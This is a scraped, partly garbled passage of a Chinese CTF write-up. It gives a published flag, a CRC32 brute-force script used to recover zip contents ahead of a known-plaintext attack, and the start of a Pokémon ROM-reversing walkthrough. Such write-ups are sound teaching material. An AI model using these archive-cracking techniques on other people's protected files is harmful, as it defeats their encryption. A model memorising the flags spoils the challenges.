class="lang-MTIzNDU2NzgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJD1AAD8AwAAAAAAAGFhYWFhYWFhXAQAAJgIAAAAAAAA">```
&#x7ED3;&#x679C;&#xFF1A;</code></pre> <pre><code>&#xFFFD;&#xFFFD;n&#xFFFD;<span class="token operator">&amp;</span>&#xFFFD;&#xFFFD;<span class="token constant">A</span>&#xFFFD;t&#xFFFD;&#xFFFD;&#xFFFD;oe&#xFFFD;&#xFFFD;<span class="token punctuation">.</span><span class="token operator">^</span>&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;<span class="token constant">S</span>&#xFFFD;<span class="token punctuation">;</span>c&#xFFFD;d3&#xFFFD;<span class="token operator">&lt;</span>&#xFFFD;&#xFFFD;&#xFFFD;g&#xFFFD;&quot;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;<span class="token constant">X</span>&#xFFFD;&#xFFFD;
                                                                                <span class="token operator">*</span>   &#xFFFD;&#xFFFD;<span class="token operator">?</span>&#xFFFD;&#xFFFD;&#xFFFD;vm
&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;<span class="token constant">F</span> &#xFFFD;<span class="token operator">|</span>&#xFFFD;<span class="token constant">D</span><span class="token operator">+</span>&#xFFFD;&#xFFFD;<span class="token punctuation">}</span>u&#xFFFD;e&#xFFFD;&#xFFFD;bq&#xFFFD;&#xFFFD;&#xFFFD;&#xC4;&#xFFFD;<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">!</span>
                             &#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;<span class="token operator">!</span>hctf<span class="token punctuation">{</span><span class="token constant">MaYb3_heAp_15_AlS0_HARD428</span><span class="token punctuation">}</span>t&#xFFFD;&#xFFFD;<span class="token number">5678</span>&#xFFFD;&#xFFFD;&#xFFFD;<span class="token number">12345678</span>\</code></pre><pre><code><span class="token comment">### big_zip</span>

&#x7531;&#x4E8E;github&#x4E0A;&#x6709;&#x5BF9;<span class="token number">6</span>&#x4F4D;&#x7684;crc32&#x7684;&#x5FEB;&#x901F;&#x7206;&#x7834;&#x811A;&#x672C;&#xFF0C;&#x6545;&#x5C06;&#x6587;&#x672C;&#x5206;&#x4E3A;<span class="token number">5</span>&#x5B57;&#x8282;&#x3002;&#x5176;&#x5B9E;&#x53EA;&#x8981;&#x5C06;github&#x4E0A;&#x7684;&#x4EE3;&#x7801;&#x7A0D;&#x7A0D;&#x6539;&#x52A8;&#x5C31;&#x80FD;&#x5FEB;&#x901F;&#x7834;&#x89E3;<span class="token number">5</span>&#x4F4D;&#x7684;crc32&#x4E86;&#x3002;</code></pre><p># -<em>- coding: utf-8 -</em>-</p> <p>import itertools import binascii import string</p> <p>class crc32_reverse_class(object): # the code is modified from <a href="https://github.com/theonlypwner/crc32/blob/master/crc32.py"target="_blank">https://github.com/theonlypwner/crc32/blob/master/crc32.py</a> def __init__(self, crc32, length, tbl=string.printable, poly=0xEDB88320, accum=0): self.char_set = set(map(ord, tbl)) self.crc32 = crc32 self.length = length self.poly = poly self.accum = accum self.table = [] self.table_reverse = []</p> <pre><code><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">init_tables</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> poly<span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token constant">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    \<span class="token comment"># build CRC32 table</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>
                i <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> <span class="token number">1</span>
                i <span class="token operator">^</span><span class="token operator">=</span> poly
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                i <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> <span class="token number">1</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>table<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    assert len<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>table<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">&quot;table is wrong size&quot;</span>
    \<span class="token comment"># build reverse table</span>
    <span class="token keyword">if</span> reverse<span class="token punctuation">:</span>
        found_none <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
        found_multiple <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            found <span class="token operator">=</span> \<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>table\<span class="token punctuation">[</span>j\<span class="token punctuation">]</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">24</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>
                    found<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>table_reverse<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tuple<span class="token punctuation">(</span>found<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
                found_none<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            elif len<span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>
                found_multiple<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        assert len<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>table_reverse<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">&quot;reverse table is wrong size&quot;</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">rangess</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">&apos;, &apos;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>lambda x<span class="token punctuation">:</span> <span class="token string">&apos;\[{0},{1}\]&apos;</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>ranges<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">ranges</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> kg <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span>enumerate<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> lambda x<span class="token punctuation">:</span> x\<span class="token punctuation">[</span><span class="token number">1</span>\<span class="token punctuation">]</span> <span class="token operator">-</span> x\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        g <span class="token operator">=</span> list<span class="token punctuation">(</span>kg\<span class="token punctuation">[</span><span class="token number">1</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">yield</span> g\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span>\<span class="token punctuation">[</span><span class="token number">7</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span> g\<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span>\<span class="token punctuation">]</span>\<span class="token punctuation">[</span><span class="token number">8</span>\<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">calc</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> accum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    accum <span class="token operator">=</span> <span class="token operator">~</span>accum
    <span class="token keyword">for</span> b <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        accum <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>table\<span class="token punctuation">[</span><span class="token punctuation">(</span>accum <span class="token operator">^</span> b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>\<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>accum <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x00FFFFFF</span><span class="token punctuation">)</span>
    accum <span class="token operator">=</span> <span class="token operator">~</span>accum
    <span class="token keyword">return</span> accum <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">findReverse</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> desired<span class="token punctuation">,</span> accum<span class="token punctuation">)</span><span class="token punctuation">:</span>
    solutions <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
    accum <span class="token operator">=</span> <span class="token operator">~</span>accum
    stack <span class="token operator">=</span> \<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">~</span>desired<span class="token punctuation">,</span><span class="token punctuation">)</span>\<span class="token punctuation">]</span>
    <span class="token keyword">while</span> stack<span class="token punctuation">:</span>
        node <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>table_reverse\<span class="token punctuation">[</span><span class="token punctuation">(</span>node\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>\<span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> len<span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
                a <span class="token operator">=</span> accum
                data <span class="token operator">=</span> \<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
                node <span class="token operator">=</span> node\<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span>\<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j<span class="token punctuation">,</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">^</span> node\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
                    a <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> <span class="token number">8</span>
                    a <span class="token operator">^</span><span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>table\<span class="token punctuation">[</span>node\<span class="token punctuation">[</span>i\<span class="token punctuation">]</span>\<span class="token punctuation">]</span>
                solutions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>tuple<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>node\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token keyword">self</span><span class="token punctuation">.</span>table\<span class="token punctuation">[</span>j\<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">+</span> node\<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span>\<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> solutions

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">dfs</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> outlist<span class="token operator">=</span>\<span class="token punctuation">[</span><span class="token string">&apos;&apos;</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp_list <span class="token operator">=</span> \<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
    <span class="token keyword">if</span> length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> outlist
    <span class="token keyword">for</span> list_item <span class="token keyword">in</span> outlist<span class="token punctuation">:</span>
        tmp_list<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>\<span class="token punctuation">[</span>list_item <span class="token operator">+</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>char_set\<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token keyword">self</span><span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> tmp_list<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">run_reverse</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    \<span class="token comment"># initialize tables</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>init_tables<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>poly<span class="token punctuation">)</span>
    \<span class="token comment"># find reverse bytes</span>
    desired <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>crc32
    accum <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>accum
    \<span class="token comment"># 4-byte patch</span>
    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>length <span class="token operator">&gt;=</span> <span class="token number">4</span><span class="token punctuation">:</span>
        patches <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>findReverse<span class="token punctuation">(</span>desired<span class="token punctuation">,</span> accum<span class="token punctuation">)</span>
        <span class="token keyword">for</span> patch <span class="token keyword">in</span> patches<span class="token punctuation">:</span>
            checksum <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>calc<span class="token punctuation">(</span>patch<span class="token punctuation">,</span> accum<span class="token punctuation">)</span>
            print <span class="token string">&apos;verification checksum: 0x{0:08x} ({1})&apos;</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
                checksum<span class="token punctuation">,</span> <span class="token string">&apos;OK&apos;</span> <span class="token keyword">if</span> checksum <span class="token operator">==</span> desired <span class="token keyword">else</span> <span class="token string">&apos;ERROR&apos;</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>dfs<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            patch <span class="token operator">=</span> map<span class="token punctuation">(</span>ord<span class="token punctuation">,</span> item<span class="token punctuation">)</span>
            patches <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>findReverse<span class="token punctuation">(</span>desired<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>calc<span class="token punctuation">(</span>patch<span class="token punctuation">,</span> accum<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> last\_4\_bytes <span class="token keyword">in</span> patches<span class="token punctuation">:</span>
                <span class="token keyword">if</span> all<span class="token punctuation">(</span>p <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>char_set <span class="token keyword">for</span> p <span class="token keyword">in</span> last\_4\_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    patch<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>last\_4\_bytes<span class="token punctuation">)</span>
                    print <span class="token string">&apos;\[find\]: {1} ({0})&apos;</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
                        <span class="token string">&apos;OK&apos;</span> <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>calc<span class="token punctuation">(</span>patch<span class="token punctuation">,</span> accum<span class="token punctuation">)</span> <span class="token operator">==</span> desired <span class="token keyword">else</span> <span class="token string">&apos;ERROR&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;&apos;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>chr<span class="token punctuation">,</span> patch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>dfs<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> crc32<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">==</span> desired<span class="token punctuation">:</span>
                print <span class="token string">&apos;\[find\]: {0} (OK)&apos;</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>item<span class="token punctuation">)</span></code></pre><p>def crc32_reverse(crc32, length, char_set=string.printable, poly=0xEDB88320, accum=0): &apos;&apos;&apos;</p> <p> :param crc32: the crc32 you wnat to reverse :param length: the plaintext length :param char_set: char_set :param poly: poly , default 0xEDB88320 :param accum: accum , default 0 :return: none &apos;&apos;&apos; obj = crc32_reverse_class(crc32, length, char_set, poly, accum) obj.run_reverse()</p> <p>def crc32(s): &apos;&apos;&apos;</p> <p> :param s: the string to calculate the crc32 :return: the crc32 &apos;&apos;&apos; return binascii.crc32(s) &amp; 0xffffffff</p> <p>from my_crc32 import * l=[0x251dee02, 0xb890530f, 0x6e6b39df, 0x50f684c3, 0xde41b551, 0x24bd35b6, 0xcef2eda8, 0xba2b1745, 0x1f4c7ea9, 0x58b2bfa9, 0x251dee02, 0xe0f81f1e, 0xbd6fbd41, 0x7342a1f6, 0x665648e9, 0xe7c594b3, 0xa60ffdd0, 0xce2ce80b, 0x22459f2d, 0x6f8a6539, 0x2073a2e4, 0x52fa60a8, 0x80410dda, 0xb7c68f27, 0x6e6b39df, 0xbd598041, 0xaa145d64, 0x16da6b3b, 0x7dd590bc, 0xb9eef5a1, 0xf0b958f0, 0x445a43f7, 0x8bd55271, 0xc0340fe2, 0xc0cd9ee5, 0x7fc7de58, 0x53bfec8a, 0x99b5537b, 0xd68019af, 0x73d7ee30, 0x5fbd3f5e]</p> <p>for k in l: crc32_reverse(k,5) print &apos;=======&apos;</p> <pre><code>```
<span class="token comment">#You\_know\_the\_bed\_feels\_warmer\_Sleeping\_here\_alone\_You\_know\_I\_dream\_in\_color\_And\_do\_the\_things\_I\_want\_You\_think\_you\_got\_the\_best\_of\_me\_Think\_you\_had\_the\_last\_laugh\_Bet\_you\_think\_that\_everything\_good\_is\_gone</span></code></pre><p>crc32&#x7206;&#x7834;&#x5B8C;&#x8FDE;&#x63A5;&#x6210;&#x6587;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x53D1;&#x73B0;&#x662F;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x3002;&#x7136;&#x540E;&#x4F7F;&#x7528;&#x5DF2;&#x77E5;&#x660E;&#x6587;&#x653B;&#x51FB;&#x5373;&#x53EF;&#x3002;&#xFF08;&#x6709;&#x4E9B;&#x4EBA;&#x8BF4;&#x56E0;&#x4E3A;&#x6211;&#x7528;7z&#x538B;&#x7F29;&#x7684;zip&#x6240;&#x4EE5;&#x4ED6;&#x5DF2;&#x77E5;&#x660E;&#x6587;&#x4E00;&#x76F4;&#x653B;&#x51FB;&#x4E0D;&#x6210;&#x529F;&#xFF0C;&#x6211;&#x8868;&#x793A;&#x662F;&#x6211;&#x6CA1;&#x6709;&#x8003;&#x8651;&#x5230;</p> <h3 id="pokemon">pokemon</h3> <p>&#x6253;&#x5F00;&#x6E38;&#x620F;&#xFF0C;&#x5927;&#x6728;&#x4F1A;&#x76F4;&#x63A5;&#x548C;&#x4F60;&#x75AF;&#x72C2;&#x6697;&#x793A;</p> <p> <a href="http://static.zybuluo.com/LoRexxar/1rpwk7e98onvveez2pez53hu/1510731550298.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/1rpwk7e98onvveez2pez53hu/1510731550298.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br> <a href="http://static.zybuluo.com/LoRexxar/nmzohkyjgk20xc6lz1alpdcs/1510731559756.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/nmzohkyjgk20xc6lz1alpdcs/1510731559756.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x5927;&#x6728;&#x544A;&#x8BC9;&#x4F60;&#xFF0C;FLAG&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x9053;&#x9986;&#xFF0C;&#x53BB;&#x6253;&#x8D25;&#x9986;&#x4E3B;&#x3002;<br>&#x5230;&#x7814;&#x7A76;&#x5BA4;&#x9886;&#x7CBE;&#x7075;&#xFF0C;&#x52A9;&#x624B;&#x7ED9;&#x4F60;20&#x4E2A;&#x5947;&#x5F02;&#x7CD6;&#x679C;&#xFF0C;&#x8BA9;&#x4F60;&#x5FEB;&#x901F;&#x5347;&#x7EA7;&#x3002;<br>&#x518D;&#x6B21;&#x63D0;&#x9192;&#x6253;&#x8D25;&#x7B2C;&#x4E00;&#x4E2A;&#x9986;&#x4E3B;&#x3002;<br> <a href="http://static.zybuluo.com/LoRexxar/wpwhp4q0rfl9ax4fil9e0sea/1510731584084.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/wpwhp4q0rfl9ax4fil9e0sea/1510731584084.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br> <a href="http://static.zybuluo.com/LoRexxar/z24p2ndnwb4kvuwkvmeluy28/1510731591892.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/z24p2ndnwb4kvuwkvmeluy28/1510731591892.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br> <a href="http://static.zybuluo.com/LoRexxar/k8w9kk3jz08ug046y8rb031g/1510731598750.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/k8w9kk3jz08ug046y8rb031g/1510731598750.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x4E00;&#x8DEF;&#x6253;&#x602A;&#x5347;&#x7EA7;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x9053;&#x9986;<br> <a href="http://static.zybuluo.com/LoRexxar/dnqsrm6il3xe3tsvt8pf8nfz/1510731610174.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/dnqsrm6il3xe3tsvt8pf8nfz/1510731610174.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x6253;&#x8D25;&#x540E;</p> <p> <a href="http://static.zybuluo.com/LoRexxar/2i7q2xzp1ckiw9f6v4m2ltq0/1510731619475.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/2i7q2xzp1ckiw9f6v4m2ltq0/1510731619475.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br> <a href="http://static.zybuluo.com/LoRexxar/0jrnucxw212j3xy5ajkgkloj/1510731626196.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/0jrnucxw212j3xy5ajkgkloj/1510731626196.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br> <a href="http://static.zybuluo.com/LoRexxar/kn7dlawybbj1jkm0u3eyei31/1510731632341.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/kn7dlawybbj1jkm0u3eyei31/1510731632341.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x9986;&#x4E3B;&#x8BF4;&#x6211;&#x4E0D;&#x4F1A;&#x544A;&#x8BC9;&#x4F60;&#x7684;&#xFF0C;&#x60F3;&#x77E5;&#x9053;&#x7684;&#x8BDD;&#x81EA;&#x5DF1;&#x53BB;&#x9006;&#x5411;&#x8FD9;&#x4E2A;rom&#x3002;<br>&#x6B63;&#x6587;&#x5F00;&#x59CB;&#x3002;<br>&#x7528;PPRE&#x5DE5;&#x5177;&#x3002;<br> <a href="http://static.zybuluo.com/LoRexxar/ew43pwln8whqdfjqn5i860v7/1510731654400.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive 